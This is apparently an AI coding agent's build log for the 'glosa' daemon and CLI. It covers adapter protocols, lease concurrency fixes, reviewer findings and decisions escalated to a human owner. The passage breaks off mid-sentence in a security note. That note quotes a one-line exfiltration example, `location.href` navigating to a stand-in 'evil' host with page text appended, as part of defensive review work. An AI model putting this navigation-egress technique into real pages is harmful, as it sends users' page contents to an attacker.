  lease rearm), `packages/cli/src/{init,hook,daemon-client}.ts` (`glosa init` transactional hook/MCP merge +
  the CC hook handlers + the daemon HTTP client). Channel command LOCKED = `--dangerously-load-development-
  channels server:glosa` (never `--channels`). ANTHROPIC scrubbed on all spawn paths.
- **Two-reviewer pass (critic + concurrency-expert) — core confirmed solid (write-path atomicity+rollback,
  invalid-JSON-abort, foreign-key exit 6, uninstall hash paths, ladder+fallback, interface matches R7); 2
  BLOCKERS + 1 CRITICAL + 1 HIGH + should-fixes, all fixed:**
  - **B1 (config corruption):** init hook merge was idempotent only by exact command string → a GLOSA_BIN
    change between runs DUPLICATED glosa's hooks (fire 2×/event forever). Fixed: reconcile hooks via the
    ownership-manifest's recorded commands + replace-in-place (like mergeMcp); owned-hook detection robust to
    both `glosa hook` + `bun run …main.ts hook` forms.
  - **B2 (spec-contract, breaks T8/P5.2):** `delivery_attempt.detail` used non-A5 §F23 values. Fixed: TYPED
    enums `via∈{channel,asyncRewake,gate,stop,userprompt,mcp_pull}`, `outcome∈{attempted,transport_accepted,
    presented,failed}`, `reason∈{initial,re_nudge}` (+error); initial-vs-re_nudge now recorded.
  - **CRITICAL (the crux F07 invariant DIDN'T hold — and its test was theater):** `armIfNeeded` spawned the
    watcher BEFORE claiming the lease, and each `glosa hook` is a separate OS process racing the on-disk lease
    → two racing Stop hooks both spawned watchers, the lease loser's kept polling + could signal Claude.
    Fixed: claim lease (O_EXCL) FIRST, spawn only after winning; replaced the coordinator-bypassing test with a
    real two-process race asserting exactly one spawn.
  - **HIGH (silent ownership loss):** concurrent `glosa init` raced the manifest RMW → uninstall could orphan
    hooks. Fixed: exclusive transaction lock around runInit.
  - should-fixes: `--print` file-independence, `runUninstall` rollback, drain candidate selection moved
    in-mutex + failed-attempt entries stay re_nudge-eligible.
- **Tests:** 874 pass / 0 fail (incl. git-hook env). **Deferred to P5.4 rehearsal:** real channel-push into a
  live idle Claude; the stdio MCP server (`glosa mcp`) is a stub (returns exit 70) — real MCP wiring is P5.4.
  **Also owed (from concurrency #4):** whoever wires `deliver()` into a live route must walk the ladder on a
  failed rung (the drain endpoint is not a retry queue). Phase 4: **P4.4 (provider iface + Codex, T2a research)
  + P4.5→P6.1 remain.**

### P4.4 provider interface + Codex provider — ✅ (commit 653b9fc) — CC: no
- **Built (Sonnet subagent, solo):** **T2a research** → `docs/research/codex-contract.md` (verified 2026-07-21
  against REAL `openai/codex` GitHub source — `hooks/src/schema.rs`, event structs — not blog paraphrase):
  CONFIRMED the hook events, snake_case stdin fields (session_id/turn_id/cwd/transcript_path/hook_event_name/
  source), the Stop-hook `decision:block`+non-empty-`reason` blocking contract, MCP client-only. Honest gaps
  documented: no Notification-equivalent (Codex attention degrades), rollout JSONL line schema unverified
  (path confirmed). `packages/providers/codex/src/{provider,hook-types}.ts` — `capabilities={push:false,
  gate:true, boundaryDrain:true, mcpPull:true}`; ladder = gate (Codex Stop hook, the only sync mechanism) →
  mcp_pull; A5 §F23 delivery vocab; liveness never PID. Mirrors ClaudeCodeProvider, purely subtractive.
- **Verify (targeted, CC:no):** research doc honest (verified vs unconfirmed), a shared root-level
  `test/agent-provider-conformance.test.ts` runs BOTH providers through identical R7 assertions + asserts the
  push-true-vs-false split, liveness-no-PID grep-guard. Tests: 902 pass / 0 fail (confirmed green 3× + hook env).
- **⚠ FLAKE now BLOCKS commits:** the intermittent idle-timeout-timer test (stream.test.ts, first noted P3.2)
  failed the pre-commit hook once (901/1) → committed on retry. **Hardening it next** so the commit gate is
  reliable for the remaining tasks. **Phase 4 done except P4.5→P6.1.** Remaining: P5.1 CLI, P5.2 acceptance
  suites (CC), P6.1 generic adapter (CC). ⛔ P5.3/P5.4 = Dawid.

### Plan change observed (Dawid edited BUILD-PLAN.md mid-run) — P6.1 supersedes P4.5
Dawid added **Phase 6 / P6.1** and marked P4.5 superseded. Substance: glosa exposes a **generic**
adapter-registration protocol (session→artifact binding, derived-from edges, data-path recognition,
class-F manifest resolution) registered by *external* code at runtime. Prove it with a **neutral in-repo
fixture adapter only**; **delete the `packages/adapters/jethro` stub**; NO `jethro` identifier anywhere
under `packages/daemon` or `packages/spa`. Real jethro integration lives in the **jethro repo** (jethro
CLI + hook + skills) — OUT OF SCOPE here; leave a jethro-side handoff note in this log at P6.1 time.
Dependency arrow jethro→glosa only. CC: yes. **Action items:** (a) when I reach P4.5, do P6.1 instead;
(b) at P6.1, drop `packages/adapters/jethro` from the workspace globs + delete the package; (c) re-read
BUILD-PLAN.md at each task pickup since Dawid may edit it again overnight.

### P6.1 generic adapter-registration protocol — ✅ — CC: yes
- **Built (solo, no delegation):** `packages/daemon/src/adapters/interface.ts` — the `ContentAdapter`
  interface (R7) + `AdapterRegistry` the daemon holds. Every method past `id`/`recognizes` is OPTIONAL;
  `workspaceRoot` is threaded through EVERY per-artifact method (not just `recognizes`) — a deliberate
  extension past the brief's terser `derivedFrom(artifactPath)` shorthand, since a single adapter instance
  can legitimately serve many concurrent workspaces and an artifact path alone is only unambiguous within
  one. `AdapterRegistry.forWorkspace()` = first-registered-match; `resolveSessionBinding()` asks every
  adapter for an opinion (R2's authoritative routing input) since "which workspace" is exactly the unknown
  at that call site, so it can't gate through `forWorkspace` first.
- **Generic behaviors wired into the CORE** (`http.ts`), each degrading to its pre-P6.1 answer when no
  adapter recognizes the workspace: `classifyWithAdapter` (R/F override, used consistently across
  GET/PUT/mint-capability so the four routes can't disagree on one artifact's class), `orderWithAdapter`
  (sidebar order — reconciled against the REAL tracked set so a misbehaving adapter can reorder but never
  hide/inject an artifact), `isArtifactStale` (derived-from source mtime > artifact mtime; "can't resolve
  the source" fails open to `false`, never guesses), `derivedFromSourcePath` (→ `artifacts/:path`'s
  `derived_from` field — confirmed this matches viewer.js's ALREADY-WRITTEN expectation: a plain source
  path string fed straight into `openArtifact()`, not an object — P3.3 apparently anticipated this exact
  P6.1 contract), `resolveManifest` (→ `manifest_path` in the class-F response; reads an adapter-named path
  through `confinePath`, same trust level as any other workspace-relative input).
- **OWED anchoring wiring closed**: `anchoring.ts`'s `resolve()` was built+tested since P3.4 but never
  called by a live route. Found the real gap: neither A1 §5.6 nor R3's own annotation payload shape names
  WHICH artifact an annotation targets — `POST .../annotations` is workspace-scoped, not artifact-scoped,
  with no `artifact_path` field anywhere in the documented wire shape. **Decision (see D9 below):** added
  an optional, additive `artifact_path` (+ `captured_rendered_sha256`) field; when present, resolves
  immediately and returns `resolution` inline in the 201. Omitting it (today's SPA does) reproduces the
  exact pre-P6.1 behavior byte-for-byte. Class R needs no adapter at all; class F builds the derived-from
  source + adapter manifest and sets `ctx.pipelineFeedback = {adapter: adapter.id, component}`.
- **Fixture adapter** (`packages/daemon/test/fixtures/adapter/fixture-adapter.ts`) — a domain-neutral
  "docs + rendered preview" adapter registering PURELY through the public protocol: marker-file recognition,
  a `rendered.html → source.md` derived-from edge, an optional `manifest.json`, "preview sorts last" sidebar
  order. Proves staleness, `derived_from`/`manifest_path` surfacing, and BOTH class-F resolution branches
  (verbatim search-in-chunk vs. `transformed:true` → `pipeline_feedback`) end-to-end over real HTTP routes.
- **Deleted `packages/adapters/jethro`** (the stub — one `src/index.ts` with a header comment, no real
  code) + dropped `packages/adapters/*` from the root workspace globs + `bun install` (lockfile updated,
  "1 package removed"). `test/workspace.test.ts`'s package-resolution list updated to match.
- **Invariant #1, grep-enforced** (`test/adapters/invariants.test.ts`): zero `jethro`/`sermon`/
  `format-sermon` matches (case-insensitive) anywhere under `packages/daemon/{src,test}` or
  `packages/spa/src`. This caught real PRE-EXISTING mentions from earlier phases — `anchoring.ts`'s own
  header comment illustrating the invariant by NAME, `lock.ts`/`lockfile-fallback.ts`'s design-provenance
  comments ("mirrors jethro's own state/lock.ts"), and incidental test fixture strings
  (`"sermon-notes.css"`, `"My Sermon (2026)!"`, a Polish test sentence). **All reworded to generic
  equivalents** (see D9) rather than narrowing the test's scope — the acceptance is meant to be literal, and
  every one of those mentions was freely reword-able without losing information.
- **Tests:** `test/adapters/{interface,zero-adapter-core,fixture-adapter,invariants}.test.ts` — 56 new
  tests. Full suite: **958 pass / 0 fail** (confirmed 2× plain + 1× with `GIT_DIR`/`GIT_INDEX_FILE`/
  `GIT_WORK_TREE` hook env set, per the standing convention). Typecheck clean. One `lifecycle.test.ts`
  subprocess-timing test failed once mid-session (stale-lock reclaim race) and passed clean on immediate
  rerun ×2 — pre-existing flake class already noted at P4.4, not a P6.1 regression (untouched code path).

- **Handoff note:** this task was built by a subagent under a session that then handed off — a SEPARATE
  fresh session was independently started around the same time (a real coordination gap in the handoff
  protocol: the outgoing session's `/goal` Stop-hook kept it alive after spawning its successor). The
  outgoing session caught its own duplication risk, yielded (`/goal clear`), and left this task
  mid-build in its own subagent; the incoming fresh session confirmed no other writes had landed,
  waited for that subagent to finish, then ran the review below. Logged so a future reader isn't
  confused by two sessions' fingerprints on one task. No file corruption occurred — verified via
  `git status` before and after.

- **Two-reviewer adversarial pass (critic + security-auditor, parallel, independent) — no CRITICALs;
  2 HIGH + 2 MEDIUM + 1 LOW, all fixed except the LOW (tracked) and one pre-existing non-blocking note:**
  - **HIGH (critic):** none of the six adapter-method call sites in `interface.ts`
    (`recognizes`/`sessionBinding`/`classifyArtifact`/`sidebarOrder`/`derivedFrom`/`manifestFor`) caught
    an exception from the adapter — a single buggy (not malicious) adapter method throwing 500'd every
    route touching that workspace, contradicting the file's own "never a throw, always degrade" premise.
    **Fixed:** a `safeAdapterCall` wrapper around every call site, degrading to each function's existing
    "adapter doesn't implement this" fallback + a `console.error` naming the adapter id/method. New tests
    prove a throwing `recognizes()` doesn't stop the registry checking later adapters, and each of the
    other five degrades correctly instead of propagating.
  - **MEDIUM (security-auditor) → became a design correction, not just a patch:** `resolveManifest`'s
    adapter-named `manifestPath` went through `confinePath` only, not the tracked-artifact membership
    every OTHER workspace path gets — a buggy adapter naming `.glosa/config.json` would get it read. The
    FIRST fix applied the full `resolveMatchedFiles` tracked-membership check (include+exclude), which
    passed review but was WRONG: it silently breaks the real manifest convention (A1 §5.4's own example,
    `chunks-<ts>/manifest.json`, is a `.json` file that will never match the sidebar's `include` glob —
    `md`/`html`/`txt` only — by design, since a chunk manifest is metadata, not a sidebar artifact).
    Caught this myself before committing by cross-checking A3 §3's literal contract ("confinePath ... at
    every path entry point ... adapter manifest" — no mention of also requiring include-glob membership).
    **Corrected fix:** an EXCLUDE-only gate (`picomatch(config.artifacts.exclude)`, mirroring `matcher.ts`'s
    own `isExcluded`) — rejects a manifestPath resolving into `.glosa/**`/`node_modules/**`/dotdirs, but
    no longer requires positive extension-based inclusion. Added a regression test proving a real
    `chunks-2026/manifest.json`-shaped path resolves successfully (this is exactly the case the
    first, over-strict fix would have silently broken) alongside the `.glosa/**`-rejection test.
  - **MEDIUM (security-auditor):** the new client-facing `artifact_path` field on `POST
    /w/:slug/annotations` is the first caller to feed `confinePath` a JSON-body-sized (up to 1 MiB)
    string rather than a URL-path-length one; `confinePath`'s ancestor-walk had no segment/length cap,
    so a traversal-clean-but-pathological value (e.g. hundreds of thousands of `a/` segments) could drive
    that many synchronous `realpathSync` calls, blocking the single-threaded daemon for one authenticated
    request. **Fixed:** `MAX_SEGMENTS = 64` / `MAX_PATH_LENGTH = 4096` ceilings in `confinePath`, rejected
    before any filesystem work. Tests prove fast rejection (both a direct `confinePath` unit test and a
    route-level test that a pathological `artifact_path` on the annotations route still 201s in <1s with
    no resolution, never a 500).
  - **LOW (both reviewers, independently — good convergence signal):** the invariant grep-guard
    (`test/adapters/invariants.test.ts`) didn't scan `packages/spa/test`, which still had 4 literal
    `"sermon"` path strings in `classf-viewer.test.ts`/`data-access.test.ts` fixture data (test-only,
    never a runtime leak, but the log's own "zero mentions" claim was narrower than stated). **Fixed:**
    widened the guard to scan `packages/spa/test` too; reworded the 4 strings to "docs".
  - **Not fixed, tracked as a follow-up (critic, SHOULD-FIX, pre-existing):** `confine-path.ts`'s
    `realPath` field is the pre-realpath joined path, not the actual realpath computed for validation —
    a TOCTOU window if a path component becomes a symlink between check and read. Pre-existing (already
    true at `http.ts`'s transcript-stream call site before P6.1); P6.1 made `resolveManifest` a second
    consumer of the same field. Not blocking — file as a follow-up against `confine-path.ts` itself.
  - Both reviewers independently confirmed clean: zero-adapter core behavior, honest anchoring
    provenance (never upgrades an unproven match), no new information-disclosure oracle on
    `artifact_path` (every non-match case — absent/missing/untracked/unconfineable — replies identically,
    201 with `resolution` simply omitted), sidebar tamper-proofing holds both directions, zero telemetry.
- **Tests after fixes:** 970 pass / 0 fail (2× confirmed), typecheck clean. Committed straight to main
  per direct-to-main policy — pre-commit hook flaked TWICE in a row on the same test
  (`bootDaemon — subprocess fault/concurrency > stale lock: dead pid is reclaimed and a fresh daemon
  boots`, a subprocess-timing test, not touched by this change) before going green on the third attempt.
  This is a NEW flake signature, distinct from the previously-logged idle-timeout SSE one — plausibly
  system load from the concurrent multi-session coordination this task involved (see handoff note
  above: several background agents/processes were active on this machine at once). Noting it as a
  second known-flaky subprocess-timing test class; retry on hook failure, don't panic-fix on one red.

### D10 — P5.2's "actual-jethro-topology" acceptance criterion, post-Phase-6 (for P5.2)
`requirements.md` T8 names an "actual-jethro-topology" suite as part of the release gate; P6.1 (Dawid's
Phase 6 correction) has since deleted all jethro code from this repo and declared real jethro
integration out of scope, built in the jethro repo instead. **Decision:** P5.2 cannot exercise a real
jethro topology (no jethro code here to exercise) — the acceptance suite is reinterpreted as proving
the SAME class of topology (session→artifact routing, derived-from staleness, class-F manifest
resolution, multi-stage sidebar ordering) generically, through the P6.1 fixture-adapter protocol, which
is exactly what P6.1's own fixture-adapter tests already exercise end-to-end over real HTTP routes. P5.2
should reuse/extend that fixture rather than inventing a second one, and its suite should be named/
documented as "adapter-topology" (not "jethro-topology") to avoid re-introducing the identifier Phase 6
just removed. This follows directly from Dawid's own Phase-6 note, not a new judgment call requiring
debate.

### P5.1 CLI surface — ✅ — CC: no (treated as a focused-review task given new daemon routes)
- **Built (solo, no delegation):** the remaining command surface into `packages/cli/src/{open,resolve,
  request-review,doctor,status,envelope,api-client}.ts`, wired via `index.ts`'s global-flag parsing
  (`--port`/`GLOSA_PORT`, `--quiet`, `--verbose`, existing `--json`/`--help`/`--version`). `resolve.ts`
  covers both `resolve` and `apply-begin` (they share the same lease mechanics). `checkpoints`/`diff`/
  `restore`/`mcp` explicitly left as "not yet implemented" — out of this task's listed deliverables.
- **New daemon routes** (none of this existed before): `POST /api/workspaces/{open,resolve,apply-begin,
  attention-request}`, `GET /api/workspaces/entry-status`, `GET /api/status` — a CLI-facing surface
  distinct from `/w/:slug/...`: these take a raw `path` (canonicalized in-handler via `canonicalOrNull`,
  same pattern `handleSessionRegister` already uses) rather than an already-registered slug, since
  `open` must work on a directory that has never been a workspace yet. Reused existing mechanisms
  throughout — `WorkspaceBus.resolveEntry`/`applyBegin`/`commitTransition`, `workspaceIndex.upsertWorkspace`
  (`"glosa-open"` source, a `WorkspaceSource` literal already reserved for this) — no new provenance
  mechanism invented.
- **`deferred` resolved honestly**: verified (not assumed) that `deferred` is absent from BOTH
  `lifecycle.ts` guard tables, so it's a genuine no-op on status — folded as an inert
  `transition_committed` event for audit, never a lease-closing terminal.
- **Doc inconsistency resolved**: `doctor` implements exactly the 12 checks A6's own table enumerates
  by name; a stray "13" elsewhere in the docs names no 13th check anywhere and is treated as a doc
  typo. The "channel actually registered" check honestly reports `skip` rather than fabricating a pass,
  since `glosa mcp` is still a stub until P5.4.
- **Focused adversarial pass (critic)** — I escalated this past its CC:no label myself, given the new
  routes touch the SAME lease/lifecycle machinery that produced 4 CRITICAL bugs at P2.3 and a blocker
  at P2.5. Verdict: ACCEPT-WITH-RESERVATIONS, 1 HIGH + 2 SHOULD-FIX, no CRITICAL:
  - **HIGH:** `WorkspaceBus.reconcileOnce()` set its guard flag before awaiting `reconcile()` and never
    reset it on throw — a scaffold failure (e.g. a permission error) permanently poisoned that bus
    instance to a silently un-reconciled state for the rest of the daemon's life, with zero further
    error. Pre-existing latent bug, but P5.1's arbitrary-path `open` route made it trivially reachable
    by any Bearer-holder naming any directory. **Fixed:** reset the flag on catch, rethrow; new fault-
    injection test proves a second `reconcileOnce()` after a thrown first one genuinely retries.
  - **SHOULD-FIX:** `resolve <id> deferred` on an ALREADY-terminal entry returned a bare 200 with
    `to:"deferred"` — technically honest in `status`, but a client reading only `to` could misread it
    as a real transition. **Fixed:** added an `isTerminal` guard (same helper `lifecycle.ts` already
    exports), now 409 `conflict` on a terminal entry, matching the same honest-rejection convention
    `NO_ACTIVE_LEASE`/`LEASE_SESSION_MISMATCH` already use.
  - **Confirmed sound, not fixed (verified, not just asserted):** the P2.3 session-forgery invariant
    still holds through the new `/api/workspaces/resolve` route — attribution comes from `lease.session`,
    never the caller-supplied field, checked line-by-line by the reviewer; the new path-based trust
    widening (arbitrary directory, not slug-scoped) is a deliberate, consistent extension of the SAME
    Bearer-token-is-the-boundary model `handleSessionRegister` already used pre-P5.1, not a new gap.
  - Reviewer flagged (not blocking, left as follow-up): a couple of test-coverage gaps (LEASE_SESSION_
    MISMATCH specifically through the new route, deferred-on-terminal before my fix existed) and a
    documentation gap (A3 doesn't yet explicitly state that Bearer possession authorizes arbitrary-
    directory bootstrap) — noted here for whoever revisits A3's wording.
- **Tests:** `packages/cli/test/{open,resolve,request-review,doctor,status,api-integration}.test.ts` +
  `packages/daemon/test/bus/reconcile-fault.test.ts` (the Fix-1 regression test) — covers daemon-
  unreachable exit codes, usage errors, exact `--json` envelope shape, unknown-id → entry_error,
  already-leased → lease_conflict 12, bad-token-perms → doctor FAIL, status succeeding at exit 0 with
  the daemon down, and now the reconcile-poisoning + deferred-on-terminal fault cases.
- **Tests:** 1012 pass / 0 fail (2× confirmed), typecheck clean.
- **Phase 5 remaining: P5.2 (acceptance suites, the release gate — LAST, CC:yes).** ⛔ P5.3/P5.4 = Dawid.

### P5.2 deterministic acceptance suites — ✅ — CC: yes — **the release gate, LAST buildable task**
- **Built (solo, no delegation for the audit itself):** rather than writing seven suites from scratch,
  audited T8's seven mandatory categories (requirements.md, verbatim) against this build's existing
  70+ test files from 18 prior tasks, verified each claim by reading actual test bodies (not filenames),
  and built only genuine gaps. Full index: `test/acceptance/T8-GATE.md` — the one place to answer
  "is the release gate green" without re-deriving coverage from memory.
- **Per category:** (1) storage/fault — journal/inbox/shadow-git/workspace-index ALREADY SATISFIED;
  BUILT `bus/reconcile-fault-lease.test.ts` closing the one real gap (no prior fault sweep ever
  truncated a journal containing a REAL apply-lease). (2) concurrency — in-process + daemon-boot
  ALREADY SATISFIED; BUILT `concurrency-real-subprocess.test.ts` (genuine gap: nothing previously hit
  a real daemon subprocess's HTTP API with genuinely concurrent socket requests against one
  workspace's lease). (3) delivery — ALREADY SATISFIED, verified end-to-end not just capability-flag
  checks. (4) browser security — BUILT `test/acceptance/security-attack-matrix.test.ts`, one
  consolidated checklist mapping every A3 §5 numbered attack to a passing test against REAL production
  functions. (5) anchor corpus — ALREADY SATISFIED, verified directly (41-case totality fuzz, full
  markup/duplicate/stale/class-F matrices, not just trusting P3.4's own claim). (6) transcript suite
  — ALREADY SATISFIED, verified directly against all 4 named fault modes. (7) adapter-topology (per
  D10, reinterpreted from "actual jethro topology" since jethro is out of this repo) — BUILT
  `adapters/adapter-topology.test.ts`, extending the shared P6.1 fixture adapter with an opt-in
  `sessionBindingFor`, proving session routing through the REAL `POST /api/sessions/register` route
  when a session's cwd doesn't match the adapter's recognized workspace.
- **Three-way adversarial pass (critic + security-auditor + concurrency-expert, parallel) — no
  CRITICAL/production bugs found; the underlying mutex/lease mechanics are sound. Findings, all
  resolved:**
  - **Test-rigor gap (concurrency-expert):** the "two different workspace roots, no contention" test
    asserted only that both concurrent requests succeeded — an assertion that would ALSO pass under
    an accidentally-GLOBAL mutex (both roots would just serialize in time and still each succeed
    within the test's timeout), so it couldn't actually distinguish correct per-root locking from a
    broken global lock. **Fixed:** rewrote to a genuine timing-discriminating test — 15 concurrent
    requests load workspace A's mutex slot, and workspace B's solo concurrent request must complete
    within 4× (or 300ms floor) of an unloaded baseline; a global mutex would push B's latency toward
    N× baseline instead. The underlying `KeyedMutex` itself was independently confirmed correctly
    per-root-scoped by the reviewer via source inspection — this was purely a test-coverage gap, not
    a production bug.
  - **Test-rigor gap (concurrency-expert):** the new lease byte-sweep's `leaseSpanEnd` was anchored
    to `apply_end`'s record start rather than `transition_committed`'s record end — meaning the
    exhaustive truncation sweep never actually tore into the ONE record that flips status to
    `"applied"`, despite the test's own docstring claiming full lease-span coverage. **Fixed:**
    re-anchored to `transition_committed`, widened the span to include its own bytes, added an
    explicit assertion that a truncation landing inside that record recovers to the PRE-transition
    snapshot and `status: "applied"` never appears from a torn write.
  - **Documentation gap (security-auditor):** attacks #1/#2 in the T8-GATE security table made an
    unbrowsered CSP-header-string-match claim without the same "deferred to P5.4 manual rehearsal"
    caveat attack #7 already carried, understating that all three make an equivalent class of
    not-actually-browser-enforced claim. **Fixed:** added the matching caveat to #1/#2.
  - **Escalated, NOT autonomously resolved (all three reviewers converged on this independently):**
    A3-security.md names `glosa token rotate`/`glosa token revoke` as required for attack #8's full
    defense; A6-cli-platform.md's canonical CLI command table doesn't list any `token` command at all
    — a genuine, unresolved conflict between two normative appendices about whether token
    rotation/revocation ships in v1. `packages/daemon/src/token.ts` has zero rotate/revoke
    implementation anywhere (confirmed independently by two reviewers via grep). The security-auditor
    traced the practical severity further: the token loads once at daemon BOOT into memory and SIGHUP
    is wired as a no-op, so recovering from a leaked token today requires killing the daemon, manually
    deleting the token file at an undocumented path, and re-running `glosa open` — there is no CLI
    surface for any step of that. **I did not implement this myself** — inventing new security-
    relevant surface (a token endpoint) unattended, this late in the build, on an unresolved spec
    conflict, is exactly the kind of call that needs Dawid's judgment (implement vs. formally descope
    v1 with a decisions.md entry), not an autonomous guess. Logged in "Blocked — needs Dawid" below.
- **Tests:** 1038 pass / 0 fail (2× confirmed after fixes), typecheck clean.
- **P5.2 done. Phase 5 done. ⛔ P5.3/P5.4 remain — Dawid-only, format-sermon companion diffs +
  manual rehearsal. All BUILD-PLAN.md tasks that can be built unattended are now ✅.**

### D9 — annotation `artifact_path` is additive, not a wire-shape rewrite (P6.1)
A1 §5.6 / R3's annotation payload has no field naming which artifact it targets — genuinely missing from
the spec, not an oversight in a prior task (`POST /w/:slug/annotations` is workspace-, not artifact-,
scoped). Two options: (a) redesign the route to be artifact-scoped (`POST /w/:slug/artifacts/:path/
annotations`), touching the SPA's `data-access.js`/`viewer.js` call sites too; (b) add an optional field,
additive, so every existing caller (today's SPA) is byte-for-byte unaffected. **Chose (b)** — P6.1's brief
was the adapter protocol + wiring anchoring reachability, not an API redesign; a future task can migrate
the SPA to send `artifact_path` (and eventually `captured_rendered_sha256`, once the client tracks a
rendered-hash) without another wire-shape change, since the field is already there and optional.

### D7 — lifecycle event representation (P2.5)
A5 §F23 lists distinct event names (created/delivered/seen/resolved/done/staled/expired). P2.1 reserved +
P2.3 already emits the generic `transition_committed{to}` / `attention_committed{to}`. **Decision:** the
lifecycle reducer standardizes on those generic transition events; the A5 names become `to` values + the
guard table (keyed off the entry's stored `kind`, common vs attention). Keeps P2.3's emission unchanged.

### D8 — terminal status vocabulary conforms to A5 §F23 (P2.5 review)
The code had mapped resolve outcome `applied → status "resolved"` (rejected/stale mapped to themselves).
A5 §F23 says common terminals are **applied/rejected/stale**. **Decision:** conform to the spec —
`resolveEntry` emits `to = outcome` (status becomes `applied`), `COMMON_TERMINALS = {applied,rejected,stale}`.
CLAUDE.md treats appendix conformance as review-blocking, so we conform rather than ratify the deviation.
(P2.5 mid-revision as of this note: also fixing an entry-kind blocker — attention entries were silently
getting the common guard table — and pointing the release-gate fault suite at the real `lifecycleReducer`.)

### D2 — handshake body shape reconciliation (for P1.3)
P1.2 gave `/api/handshake` an internal readiness body `{protocol_version, instance_id, pid, started_at}`.
A1 §5.1 mandates the **public** body `{contract_version, daemon_version, paired}`. Same endpoint serves
both readiness (F13) and contract negotiation (A1). **Decision (as built in P1.3):** the handshake body is
a **superset** — `{contract_version, daemon_version, paired}` (A1 §5.1, for the SPA) PLUS P1.2's
`{protocol_version, instance_id, pid, started_at}` (for lifecycle readiness). `contract_version` ==
`protocol_version` == `PROTOCOL_VERSION` ("1.0") today. **Correction (per P1.3 adversarial review):**
`ensureDaemon()` intentionally still reads/validates **`protocol_version`** (lifecycle compat), NOT
`contract_version` — lifecycle-compat and API-contract-compat are kept as two separate concerns that happen
to share one route (`protocol.ts` vs `contract.ts`). This is more correct than my original note; the two
version constants may legitimately diverge later. No code change needed — the superset keeps P1.2's client
working unchanged.

### D3 — Origin allowlist on unmatched routes (P1.3 review, BLOCKER 1)
A1 §1 ("Origin allowlisted first, 403 regardless of route") vs A3 §4/R5 ("Origin check is route-class-
scoped"). The original P1.3 returned 404 for unmatched routes before any Origin check → a foreign origin
could distinguish real routes (403) from fake (404) = a route-enumeration side channel. **Decision:** an
unmatched route with a present-and-foreign `Origin` → **403 invalid-origin** before the 404; absent/self
Origin → normal 404. Satisfies A1 §1 without weakening A3 §4's per-class rules on matched routes.

### D4 — malformed `X-Contract-Version` (P1.3 review, SHOULD-FIX 3)
A1 §3 only blesses leniency for a *missing* header. **Decision:** unparseable/partial versions (`""`, `"1"`,
`"1.0.0"`, `"abc"`) are treated as "missing → lenient, same major assumed" (A1 §3's stated intent for
non-SPA clients like a future CLI); only a **well-formed value whose major differs** from PROTOCOL_VERSION →
409. Documented in a `contract.ts` comment + a `contract.test.ts` matrix.

## HANDOFF — jethro-side content adapter (file as a jethro-repo issue)

**Not glosa's scope.** P6.1 deleted the `packages/adapters/jethro` stub and proved the generic
adapter-registration protocol against a domain-neutral fixture only (invariant #1: the glosa core carries
zero domain knowledge). The REAL jethro integration is now entirely jethro's own responsibility, built in
the **jethro repo**, depending on glosa's published protocol (`packages/daemon/src/adapters/interface.ts`'s
`ContentAdapter` shape) — **dependency arrow jethro → glosa, never the reverse.** File a jethro issue
covering:

1. **Recognition** — `recognizes(workspaceRoot)` returns true for `~/.claude/plugins/data/jethro-jethro/
   sermon-sessions/<id>/` (the fixed plugin-data path jethro already owns).
2. **Session binding** — `sessionBinding(hint)` reads jethro's own `state.json` `session_history` to map a
   live session to its sermon-session workspace, supplying R2's authoritative routing input from
   jethro-specific state the glosa core never has to parse.
3. **Sidebar ordering** — `sidebarOrder(workspaceRoot, artifacts)` orders numbered stage files by their
   pipeline stage; marks the canonical manuscript (`canonical_manuscript` pointer when present, else the
   `07b`→`07` fallback per requirements.md R7 — verified as the common case in an earlier phase's research).
4. **Derived-from edge** — `derivedFrom(workspaceRoot, artifactPath)` declares the speech-notes-HTML →
   manuscript edge (`output/<slug>/speech-notes-*.html` derived FROM the numbered manuscript stage, via
   process `"format-sermon"`), which is what the glosa core needs to enable class-F Edit + staleness with
   zero further domain knowledge.
5. **Class-F manifest** — `manifestFor(workspaceRoot, artifactPath)` resolves `chunks-<ts>/manifest.json`
   for the speech-notes HTML artifact, feeding the (already-generic, already-tested-here) `anchoring.ts`
   class-F cascade + `pipelineFeedback` target.
6. **Registration** — jethro's own CLI/hook/skill wiring constructs the adapter and registers it with a
   running glosa daemon at startup (the exact registration entry point — an MCP tool call, a hook, a
   `glosa`-side plugin-load convention — is a jethro-repo design decision; glosa's `AdapterRegistry` only
   needs `register(adapter: ContentAdapter)` called once per process, from wherever jethro's own runtime
   lives).

Schema authority for jethro's own state shapes remains the TypeScript types in
`~/code/jethro/mcp-server/src/state/` (per requirements.md R7) — glosa's protocol says nothing about
jethro's internals, only the shape jethro must hand back.

## Blocked — needs Dawid

- **P5.3 format-sermon companion diffs (HITL)** — pre-marked ⛔; touches `~/.claude/skills/format-sermon/`
  outside the repo. Will prepare proposed diffs as a doc, not apply.
- **P5.4 manual rehearsal (T8)** — pre-marked ⛔; needs a live Claude session + Dawid's eyes.

- **⚠ SPEC-CONFLICT DECISION — token rotate/revoke (surfaced by P5.2's three-reviewer pass; needs
  Dawid).** `docs/appendices/A3-security.md` names `glosa token rotate`/`glosa token revoke` as
  required for attack #8's full defense ("revoke → old Bearer 401"). `docs/appendices/A6-cli-platform.md`'s
  own canonical "Full command surface" table doesn't list a `token` command at all. Neither
  `requirements.md` nor `decisions.md` resolves the disagreement. `packages/daemon/src/token.ts` has
  zero rotate/revoke logic (confirmed independently by two reviewers via grep) — this is a real,
  unimplemented gap, not just an untested one. Practical severity, traced by the security-auditor:
  the daemon loads its token once at BOOT into memory and `SIGHUP` is a no-op, so recovering from a
  leaked/exfiltrated Bearer token today requires killing the daemon, manually deleting the token file
  at an undocumented path, then re-running `glosa open` — no CLI surface exists for any step. All
  three independent reviewers (critic, security-auditor, concurrency-expert's report didn't touch
  this but the other two converged unprompted) flagged this as something a report shouldn't silently
  resolve as "non-blocking." **Decision needed from Dawid:** (a) implement a `glosa token
  rotate`/`revoke` command (mint a fresh token + a live-reload signal the running daemon can pick up
  without a full restart) as a near-term v1.x follow-up, or (b) formally descope it from v1 with a
  `decisions.md` entry narrowing A3 §5 attack #8's stated defense to match what's actually shipping.
  Given the local-first/loopback-only/single-user threat model and that CSP+sandbox+nonce (attacks
  #1-3) are what actually stand between a hostile page and token exfiltration in the first place,
  recommend (a) as a fast follow rather than blocking v1 on it — but this is Dawid's call, not mine to
  make unattended this late in the build.

- **⚠ SECURITY DECISION — class-F self-navigation egress (surfaced in P4.1 review; needs Dawid).** The
  class-F CSP + sandbox genuinely close fetch/XHR/WebSocket/img/form egress (tested), BUT a sandboxed
  `allow-scripts` iframe can always navigate ITSELF (`location.href="https://evil/leak?"+pageText`, an
